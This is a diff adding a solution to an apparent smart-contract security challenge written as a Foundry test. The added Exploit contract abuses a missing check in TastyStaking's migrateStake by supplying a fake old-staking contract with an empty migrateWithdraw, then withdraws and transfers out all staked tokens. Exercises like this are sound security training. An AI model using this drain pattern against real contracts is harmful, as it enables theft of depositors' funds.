@@ -75,6 +75,10 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
         
         // implement solution here
+        //We are able to withdraw all STAKE token due to some miss check
+        //See the Exploit contract to understand the process
+        Exploit _exploit = new Exploit(address(tastyStaking),address(steak));
+        _exploit.pwn();
 
         vm.stopPrank();
         validation();
@@ -89,4 +93,28 @@ contract Testing is Test {
 
     }
 
+}
+
+contract Exploit {
+
+    address owner;
+    TastyStaking _tastyStaking;
+    Token  stakingToken;
+    constructor(address _target, address _stakingToken){
+        owner=msg.sender;
+        _tastyStaking=TastyStaking(_target);
+        stakingToken = Token(_stakingToken);
+    }
+
+    //TastStaking contract will call this function and  then increase our balance
+    function migrateWithdraw(address staker, uint256 amount) external  {
+        
+    }
+    //migrateStake() wil call migrateWithdraw of our contract and not from the tastStaking contract and so we skip the check 
+    //We can choose the parameter address oldStaking so we can put our contract address
+    function pwn() external {
+        _tastyStaking.migrateStake(address(this), stakingToken.balanceOf(address(_tastyStaking)));
+        _tastyStaking.withdrawAll(false);
+        stakingToken.transfer(owner, stakingToken.balanceOf(address(this)));
+    }
 }
